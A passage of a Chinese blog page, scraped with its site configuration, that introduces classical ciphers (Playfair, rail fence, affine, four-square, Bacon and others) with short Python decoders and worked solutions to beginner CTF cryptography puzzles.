href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D912\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=912</a></p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php\" target=\"_blank\" rel=\"noopener\">http://rumkin.com/tools/cipher/playfair.php</a></p>\n<p>普莱费尔真题-one：</p>\n<p>Buuctf-crypto-cipher</p>\n<p>还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}</p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php\" target=\"_blank\" rel=\"noopener\">http://rumkin.com/tools/cipher/playfair.php</a></p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-2be2d0bcb297711754a46296432e8f3d_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"Nihilist密码：\"><a href=\"#Nihilist密码：\" class=\"headerlink\" title=\"Nihilist密码：\"></a><strong>Nihilist密码：</strong></h2><p>Nihilist跟polybius密码差不多</p>\n<p>相同的先看纵向，在看横向。</p>\n<p>例如a=[2,3]=23</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-929026378b34e6fd342567e8adf92a2d_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"Keyboard密码：\"><a href=\"#Keyboard密码：\" class=\"headerlink\" title=\"Keyboard密码：\"></a><strong>Keyboard密码：</strong></h2><p>Keyboard密码在ctf中应该是分多种类型的。这里提两种。即9键表和26键包含</p>\n<p>9键表就是通过九键上多次字母来进行字母提取</p>\n<p>26键包含通过明文多个字符对应一个密文</p>\n<p>9键表真题：</p>\n<p>直接放两道题来理解</p>\n<p>Buuctf- Crypto-[NCTF2019]Keyboard</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-7ab75ce548f7ec78fb0dcc1c305d78b8_720w.jpg\" alt=\"img\"></p>\n<p>分析第一个字符串，ooo，o在键盘上对应的是9，有3个o，表示第9个格子的第三个字母，就是y。那yyy就是指字母o</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-5579f6bceb2f7b7be87c13a30ae19628_720w.jpg\" alt=\"img\"></p>\n<p>cipher=”ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee”</p>\n<p>base=” qwertyuiop”</p>\n<p>a=[“ “,” “,”abc”,”def”,”ghi”,”jkl”,”mno”,”pqrs”,”tuv”,”wxyz”]</p>\n<p>#print(base.index(“q”))</p>\n<p>for part in cipher.split(“ “):</p>\n<p>  s=base.index(part[0])</p>\n<p>  count=len(part)</p>\n<p>  #print(a[9][2],end=””)</p>\n<p>  print(a[s][count-1],end=””)</p>\n<p>第一步：</p>\n<p><strong>构造3个需要的值，变量和列表</strong></p>\n<p><strong>cipher就是题目附件的字符串</strong></p>\n<p><strong>base就是键盘上一行对应的数字，第一个为空。因为索引的时候，第一个为0。使得q正好为1</strong></p>\n<p><strong>a列表第一个的空格字符串同理。也是0。如下走下来空格对应九格键盘上的1，abc就对应九格键盘上的数字2，def对应3。</strong></p>\n<p>第二步：</p>\n<p>index就是索引的值，就是取键盘上的数字</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-8370c8c5599d16c927c2a7216487abdd_720w.jpg\" alt=\"img\"></p>\n<p><strong>a[][]。列表的两次，就直接取对应的字母了。end是为了不换行。</strong></p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-24e40bf3a20626da1ee809fac0c5637e_720w.jpg\" alt=\"img\"></p>\n<p><strong>count的减1，还是因为第一个是0</strong></p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-e307810ec18c982899f092d77449e2f3_720w.jpg\" alt=\"img\"></p>\n<p>Buuctf- Crypo-[MRCTF2020]keyboard</p>\n<p>得到的flag用</p>\n<p>MRCTF{xxxxxx}形式上叫</p>\n<p>都为小写字母</p>\n<p>6</p>\n<p>666</p>\n<p>22</p>\n<p>444</p>\n<p>555</p>\n<p>33</p>\n<p>7</p>\n<p>44</p>\n<p>666</p>\n<p>66</p>\n<p>3</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-857b995784eef5b15242292fdc9d57d4_720w.jpg\" alt=\"img\"></p>\n<p>str=”6 666 22 444 555 33 7 44 666 66 3”</p>\n<p>a=[“ “,” “,”abc”,”def”,”ghi”,”jkl”,”mno”,”pqrs”,”tuv”,”wxyz”]</p>\n<p>for i in str.split(“ “):</p>\n<p>  s=int(i[0])</p>\n<p>  count=len(i)</p>\n<p>  print(a[s][count-1],end=””)</p>\n<p><strong>这边解出来最后一个字母是d。但提交不上。搜一下这个单词就知道最后一个应该打错了。是e</strong></p>\n<p>26键包含真题：</p>\n<p>实验吧-密码学-keyword</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-e070e8a0e26fa380290d53e7d2704093_720w.jpg\" alt=\"img\"></p>\n<p>根据题目hint：应该。是键盘包围，或者画图</p>\n<p>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN</p>\n<p>空格划组 逗号也算一个里面</p>\n<p>直接画出来</p>\n<p>NBNCBNNBNBC</p>\n<h2 id=\"栅栏密码：\"><a href=\"#栅栏密码：\" class=\"headerlink\" title=\"栅栏密码：\"></a><strong>栅栏密码：</strong></h2><p>栅栏密码是典型的置换密码。把明文分成n个1组。在进行连接。根据如何连接，又分为普通栅栏密码（|||栅栏密码）和W型栅栏密码。</p>\n<p>普通栅栏密码（|||栅栏密码）</p>\n<p>值和n：</p>\n<p>fslda1g2{3a}</p>\n<p>n=2</p>\n<p>按2个分组</p>\n<p>fs  ld  a1  g2  {3  a}</p>\n<p>取第一个</p>\n<p>flag{a</p>\n<p>在取全部</p>\n<p>flag{asd123}</p>\n<p>普通栅栏密码（|||栅栏密码）真题-one：</p>\n<p>Buuctf-Crypto-篱笆墙的影子</p>\n<p>直接两栏获得flag</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-ecb70e84f97468a9c5eed6923bc6a2f0_720w.jpg\" alt=\"img\"></p>\n<p>w型栅栏密码</p>\n<p>写成W型的栅栏密码。但读取还是按行从左往右读取。</p>\n<p>值和n：</p>\n<p>flag{asd123}</p>\n<p>n=2</p>\n<p>照样是2个分组</p>\n<p>f.a.{.s.1.3</p>\n<p>.l.g.a.d.2.}</p>\n<p>直接从左往右读取</p>\n<p>fa{s13lgad2}</p>\n<p>W型栅栏密码真题-one：</p>\n<p>攻防世界Crypto新手-Railfence</p>\n<p>根据题目名和题目描述可知是栅栏密码。</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-bb5b130d16c4a1530b1a1d0403ee7e8f_720w.jpg\" alt=\"img\"></p>\n<p>但不是普通的|||型栅栏密码</p>\n<p>是变种的W型栅栏密码</p>\n<h3 id=\"在线解密：\"><a href=\"#在线解密：\" class=\"headerlink\" title=\"在线解密：\"></a><strong>在线解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=777</a></p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-090a754d2d59387491b0becd12bf1c92_720w.jpg\" alt=\"img\"></p>\n<p>手解：</p>\n<p>把值按照W型进行横排排列，把明文的第一个填充到密文的第一行第1个位置，把明文的第二个填充到密文的第一行第9个位置。在把明文的第三个填充到密文的第17个位置。在把明文的第四个填充到密文的第25个位置。在把明文的第五个填充到密文的第33个位置。</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-bdccd3e6610deff7b3399f83385cd15c_720w.jpg\" alt=\"img\"></p>\n<p>当len=35，key=5时（这个就自己画一画吧）然后你就会发现：首行和尾行的间隔依旧不变，假设行数为i，当当前数为第2行的奇数的时候，下一个数字为2+6=8也就是（key-i）<em>2,若当前数为第二行偶数的时候，下一个数字为8+2=10也就是(i-1)</em>2。</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-02d6283fe27ea56f8d866bd028d3189f_720w.jpg\" alt=\"img\"></p>\n<h4 id=\"普通栅栏密码加解密：\"><a href=\"#普通栅栏密码加解密：\" class=\"headerlink\" title=\"普通栅栏密码加解密：\"></a>普通栅栏密码加解密：</h4><p><a href=\"https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/zhalanmima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>\n<h4 id=\"W型栅栏密码在线加解密：\"><a href=\"#W型栅栏密码在线加解密：\" class=\"headerlink\" title=\"W型栅栏密码在线加解密：\"></a>W型栅栏密码在线加解密：</h4><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=777</a></p>\n<h2 id=\"云影密码：\"><a href=\"#云影密码：\" class=\"headerlink\" title=\"云影密码：\"></a><strong>云影密码：</strong></h2><p>有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0=28， 也就是0=2+8，同理7=124，  9=18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”。</p>\n<p>也给出一个python脚本地址：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/b5aa5cf60f83\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/b5aa5cf60f83</a></p>\n<pre class=\"line-numbers language-text\"><code class=\"language-text\">#!/usr/bin/python\n# -*- coding=utf8 -*-\n\"\"\"\n# @Author : pig\n# @CreatedTime:2019-11-2423:54:02\n# @Description : \n\"\"\"\n\n\ndef de_code(c):\n    dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)]\n    flag = []\n    c2 = [i for i in c.split(\"0\")]\n    for i in c2:\n        c3 = 0\n        for j in i:\n            c3 += int(j)\n        flag.append(dic[c3 - 1])\n    return flag\n\ndef encode(plaintext):\n    dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)]\n    m = [i for i in plaintext]\n    tmp = [];flag = []\n    for i in range(len(m)):\n        for j in range(len(dic)):\n            if m[i] == dic[j]:\n                tmp.append(j + 1)\n    for i in tmp:\n        res = \"\"\n        if i >= 8:\n            res += int(i/8)*\"8\"\n        if i%8 >=4:\n            res += int(i%8/4)*\"4\"\n        if i%4 >=2:\n            res += int(i%4/2)*\"2\"\n        if i%2 >= 1:\n            res += int(i%2/1)*\"1\"\n        flag.append(res + \"0\")\n    print (\"\".join(flag)[:-1])\n\nc = input(\"输入要解密的数字串:\")\nprint (de_code(c))\nm_code = input(\"请输入要加密的数字串:\")\nencode(m_code)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"简单位移密码：\"><a href=\"#简单位移密码：\" class=\"headerlink\" title=\"简单位移密码：\"></a><strong>简单位移密码：</strong></h2><p>这个密码是我在《ctf特训营》这本书上看到的。自己并没有在题目中做到过</p>\n<p>实例借鉴书中</p>\n<p>m=flag{easy_easy_crypto}</p>\n<p>k=”3124”</p>\n<p>len(k)=4，切分m。</p>\n<p>flay {eas y_ea sy_c rypt o}</p>\n<p>按照3124直接排列</p>\n<p>Lafg ea{s _eya y_sc yprt }o</p>\n<p>密文：</p>\n<p>Lafgea{s_eyay_scyprt}o</p>\n<p>解密代码：</p>\n<pre class=\"line-numbers language-text\"><code class=\"language-text\">def shift_decrypt(c,k):\n    l=len(k)\n    m=\"\"\n    for i in range(0,len(c),l):\n        tmp_m=[\"\"]*l\n        if i+l>=len(c):\n            tmp_c=c[i:]\n            use=[]\n            for kindex in range(len(tmp_c)):\n                use.append(int(k[kindex])-l)\n            use.sort()\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[use.index(int(k[kindex])-l)]\n        else:\n            tmp_c=c[i:i+l]\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[int(k[kindex])-1]\n        m+=\"\".join(tmp_m)\n    return m\nc=\"lafgea{s_eyay_scyprt}o\"\nk=\"3124\"\nprint shift_decrypt(c,k)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"曲路密码：\"><a href=\"#曲路密码：\" class=\"headerlink\" title=\"曲路密码：\"></a><strong>曲路密码：</strong></h2><p>按照事先约定的原则把明文填入表中</p>\n<p>例如：明文为HelloWorldab</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-c8e5bd0d1dfa3ececd04d2d2bd49863a_720w.jpg\" alt=\"img\"></p>\n<p>按照一定的顺序进行遍历</p>\n<p>密文就是lrbaoleWdloH</p>\n<p><strong>CTF crypto线下工具推荐：</strong></p>\n<p><strong>CTFCrackTools</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/Acmesec/CTFCrackTools\" target=\"_blank\" rel=\"noopener\">https://github.com/Acmesec/CTFCrackTools</a></p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-1131910e2546d1455cf91261f8369e73_720w.jpg\" alt=\"img\"></p>\n<p><strong>CyberChef</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.chinabaiker.com/cyberchef.htm\" target=\"_blank\" rel=\"noopener\">https://www.chinabaiker.com/cyberchef.htm</a></p>\n<p>直接可以下载到本地</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-aa7579316f632a3a6351bb73f1bf9840_720w.jpg\" alt=\"img\"></p>\n<p><strong>参考：</strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//ctf-wiki.github.io/ctf-wiki/crypto\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/crypto</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki\" target=\"_blank\" rel=\"noopener\">https://zh.wikipedia.org/wiki</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//baike.baidu.com\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com</a></p>\n<p>《ctf特训营》</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//buuoj.cn/\" target=\"_blank\" rel=\"noopener\">https://buuoj.cn/</a></p>\n<p><strong>相关实验：</strong></p>\n<p>相关实验：密码学原理</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//sourl.cn/9cMsyV\" target=\"_blank\" rel=\"noopener\">课程:密码学原理(合天网安实验室)</a></p>\n<p>（密码学是研究如何隐密地传递信息的学科。通过本课程实验掌握密码学的相关知识。）</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<p>[toc]</p>\n<h1 id=\"古典密码从0到1\"><a href=\"#古典密码从0到1\" class=\"headerlink\" title=\"古典密码从0到1\"></a>古典密码从0到1</h1><p><strong><img src=\"https://pic1.zhimg.com/80/v2-f483400333b7ccaa8689e9cfc0c3e8dc_720w.jpg\" alt=\"img\"></strong></p>\n<h2 id=\"古典密码和现代密码的区别：\"><a href=\"#古典密码和现代密码的区别：\" class=\"headerlink\" title=\"古典密码和现代密码的区别：\"></a><strong>古典密码和现代密码的区别：</strong></h2><p>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用替换式密码或移项式密码，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是 A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</p>\n<p>现代的方法是用电脑或是其它数字科技，基于比特和字节上操作。许多经典密码被受尊重的人使用，像是尤利乌斯·凯撒和拿破仑，他们创造了一些常被人们使用的密码。许多密码起源于军事上，相同立场的人常使用来寄送秘密消息。经典的方法常攻击密码文，有时候甚至不知其密码系统，也可以使用工具，像是频率分析法。有些经典密码是使用先进的机器或是机电密码机器，像是恩尼格玛密码机。                           —维基</p>\n<p>其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：</p>\n<p>单表替换加密（Monoalphabetic Cipher）</p>\n<p>多表替换加密（Polyalphabetic Cipher）</p>\n<p>奇奇怪怪的加密方式                                             –ctf wiki</p>\n<h2 id=\"凯撒密码：\"><a href=\"#凯撒密码：\" class=\"headerlink\" title=\"凯撒密码：\"></a><strong>凯撒密码：</strong></h2><p>​    凯撒曾经使用这种密码与其将军们来联系，所以用凯撒来命名这种密码。</p>\n<p>根据图片来了解加密原理。凯撒密码一般适用于26个英文字母。根据偏移量来进行加密。如图所示，当偏移量=3。即是A-D,B-E。</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-ab311b6e604849f12c19e5e96818a925_720w.jpg\" alt=\"img\"></p>\n<p>​    把字母转成数学，数学公式如下。</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-f77f29985ee9014f3df11575682ac180_720w.jpg\" alt=\"img\"></p>\n<h3 id=\"在线加解密网站：\"><a href=\"#在线加解密网站：\" class=\"headerlink\" title=\"在线加解密网站：\"></a><strong>在线加解密网站：</strong></h3><p><a href=\"https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/kaisamima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//www.metools.info/code/c70.html\" target=\"_blank\" rel=\"noopener\">http://www.metools.info/code/c70.html</a></p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D778\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=778</a></p>\n<h2 id=\"仿射密码：\"><a href=\"#仿射密码：\" class=\"headerlink\" title=\"仿射密码：\"></a><strong>仿射密码：</strong></h2><p>数学加密公式：</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-1a7aeab7e90203fc056e398344ce2b7a_720w.jpg\" alt=\"img\"></p>\n<p>仿射密码中解密需要用到求逆元</p>\n<p>直接给出python解密脚本：</p>\n<pre><code class=\"text\">import primefac\ndef affine_decode(c,a,b,origin=&quot;abcdefghijklmnopqrstuvwxyz&quot;):\n    r=&quot;&quot;\n    n=len(origin)\n    ai=primefac.modinv(a,n)%n\n    for i in c:\n        if origin.find(i)!=1:\n            r+=origin[(ai*(origin.index(i)-b))%n]\n        else:\n            r+=i\n    return r\nprint affine_decode(&quot;ihhwvcswfrcp&quot;,5,8)\n\ndef affine_guessab(m1,c1,m2,c2,origin=&quot;abcdefghijklmnopqrstuvwxyz&quot;):\n    x1=origin.index(m1)\n    x2=origin.index(m2)\n    y1=origin.index(c1)\n    y2=origin.index(c2)\n    n=len(origin)\n    dxi=primefac.modinv(x1-x2,n)%n\n    a=dxi*(y1-y2) % n\n    b=(y1-a*x1)%n\n    return a,b\nprint affine_guessab(&quot;a&quot;,&quot;i&quot;,&quot;f&quot;,&quot;h&quot;)</code></pre>\n<h3 id=\"仿射密码在线加解密网站：\"><a href=\"#仿射密码在线加解密网站：\" class=\"headerlink\" title=\"仿射密码在线加解密网站：\"></a>仿射密码在线加解密网站：</h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D911\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=911</a></p>\n<h5 id=\"仿射密码真题-one：\"><a href=\"#仿射密码真题-one：\" class=\"headerlink\" title=\"仿射密码真题-one：\"></a>仿射密码真题-one：</h5><p>Buuctf- Crypto-[GKCTF2020]小学生的密码学</p>\n<p>e(x)=11x+6(mod26)</p>\n<p>密文：welcylk</p>\n<p>（flag为base64形式）</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-cf93192b800a57815bc7b5c050f8c673_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-b9d84b6e31edf9ebe9931c5174eba819_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"四方密码：\"><a href=\"#四方密码：\" class=\"headerlink\" title=\"四方密码：\"></a><strong>四方密码：</strong></h2><p>四方密码是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。</p>\n<p>这种方法将字母两个一组，然后采用多字母替换密码。</p>\n<p>四方密码用4个5×5的矩阵来加密。每个矩阵都有25个字母（通常会取消Q或将I,J视作同一样，或改进为6×6的矩阵，加入10个数字）。</p>\n<p>选两个密钥，example和keyword。去掉重复的字母。就是example变成exampl。余下的字母顺序存入矩阵即可</p>\n<p>加密矩阵放右上和左下。</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-7f9734b21e0caee6689d77d9de7e1b6c_720w.jpg\" alt=\"img\"></p>\n<p>加密步骤。把字符串按两个字母一组分开</p>\n<p>Helloworld</p>\n<p>He ll ow or ld</p>\n<p>找第一组第一个字母在左上角矩阵的位置：</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-c210fedc80540995f608f795a073acda_720w.jpg\" alt=\"img\"></p>\n<p>找第一组第二个字母在右下角矩阵的位置：</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-165d0ff7602b3b7801cd2e050cc948e0_720w.jpg\" alt=\"img\"></p>\n<p>先找和一个字母同横的，和第二个字母同直的</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-9df900be2dee2b0602d420ff290a5adc_720w.jpg\" alt=\"img\"></p>\n<p>第一个字母同直，第二个字母同横的</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-01dc7c7890019f58beef4ade3bd5eab7_720w.jpg\" alt=\"img\"></p>\n<p>得到he加密后为FY</p>\n<p>如此可得接下来，最后就是</p>\n<p>he lp me ob iw an ke no bi</p>\n<p>FY GM KY HO BX MF KK KI MD</p>\n<h5 id=\"四方密码真题-one：\"><a href=\"#四方密码真题-one：\" class=\"headerlink\" title=\"四方密码真题-one：\"></a>四方密码真题-one：</h5><p>Buuctf-crypo-四面八方</p>\n<p>四方密码：</p>\n<p>wiki上了解四方密码如何加解密的一个过程</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC\" target=\"_blank\" rel=\"noopener\">https://zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC</a></p>\n<p>密钥存阵</p>\n<p>通常在题目中会给定2个密钥，我们要去掉Q或者把I和J当成一个。按照26个英文字母。秘钥中出现的不填。补充成5*5的矩阵</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-bf5760187447c0cdd17602207d2b8453_720w.jpg\" alt=\"img\"></p>\n<p>这题直接填充即可</p>\n<p>securityabdfghjklmnopvwxz</p>\n<p>securityadbfghjklmnopvwxz</p>\n<p>abcdefghijklmnopqrstuvwxyz</p>\n<p>informatn</p>\n<p>informatbcdeghjklpsuvwxyz</p>\n<p>abcdefghijklmnopqrstuvwxyz</p>\n<h3 id=\"在线解密工具：\"><a href=\"#在线解密工具：\" class=\"headerlink\" title=\"在线解密工具：\"></a><strong>在线解密工具：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html\" target=\"_blank\" rel=\"noopener\">http://ctf.ssleye.com/four.html</a></p>\n<p>根据题目说的解出来的语句是个通顺的句子，那肯定排序就有点问题</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-6dfcefe68d59545916e53be11cfebb3c_720w.jpg\" alt=\"img\"></p>\n<p><strong>接下来可以拿出词频分析。</strong></p>\n<p>这边分割可以多试试。可以看出来个success，其他位置试</p>\n<p><strong><a href=\"https://link.zhihu.com/?target=https%3A//quipqiup.com/\" target=\"_blank\" rel=\"noopener\">https://quipqiup.com/</a></strong></p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-8a82b177919a7e61bcc1d84ff940acb2_720w.jpg\" alt=\"img\"></p>\n<h3 id=\"四方密码在线加解密网站：\"><a href=\"#四方密码在线加解密网站：\" class=\"headerlink\" title=\"四方密码在线加解密网站：\"></a>四方密码在线加解密网站：</h3><p><a href=\"https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html\" target=\"_blank\" rel=\"noopener\">http://ctf.ssleye.com/four.html</a></p>\n<h2 id=\"培根密码：\"><a href=\"#培根密码：\" class=\"headerlink\" title=\"培根密码：\"></a><strong>培根密码：</strong></h2><p>培根密码直接根据表中的字母进行转换。</p>\n<p>密文一般只含有a和b字母</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-9e23a167e68739049ecb21cdde085a98_720w.jpg\" alt=\"img\"></p>\n<p>培根密码在线解密：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//tool.bugku.com/peigen/\" target=\"_blank\" rel=\"noopener\">https://tool.bugku.com/peigen/</a></p>\n<p>培根密码真题-one：</p>\n<p>攻防世界crypto新手-不仅仅是morse</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-bc8cc8808aa0560f4811c4e0c2283a3f_720w.jpg\" alt=\"img\"></p>\n<p>把/转换成空格。直接拿出morse解密</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-7712dc9ce03f0cbad6f2e3cf68b19062_720w.jpg\" alt=\"img\"></p>\n<p>在看后面一段像培根密码，根据题目提示是食物加密。</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-8f60398906141bf4062ade9faa45787d_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"标准银河字母：\"><a 